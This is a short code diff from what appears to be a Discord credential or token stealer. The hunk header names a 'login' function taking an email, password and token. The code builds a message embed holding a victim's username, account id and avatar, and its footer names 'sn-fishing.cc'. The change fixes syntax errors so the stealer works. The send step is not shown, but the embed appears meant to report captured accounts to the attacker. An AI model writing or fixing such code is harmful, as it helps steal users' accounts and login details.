@@ -368,11 +368,11 @@ const login = async (email, password, token) => {
             ],
             "author": {
                 "name": json.username +"#" + json.discriminator + " (" + json.id + ") ",
-                "icon_url": "https://cdn.discordapp.com/attachments/988813048900907051/989314536152653904/8c97eb5bb60b5e7bae869b44ddad6333.gif"
+                icon_url: "https://cdn.discordapp.com/attachments/988813048900907051/989314536152653904/8c97eb5bb60b5e7bae869b44ddad6333.gif"
             },
             "footer": {
-                "text": "sn-fishing.cc"
-                "icon_url": "https://cdn.discordapp.com/attachments/988813048900907051/989314536152653904/8c97eb5bb60b5e7bae869b44ddad6333.gif"
+                "text": "sn-fishing.cc",
+                icon_url: "https://cdn.discordapp.com/attachments/988813048900907051/989314536152653904/8c97eb5bb60b5e7bae869b44ddad6333.gif"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
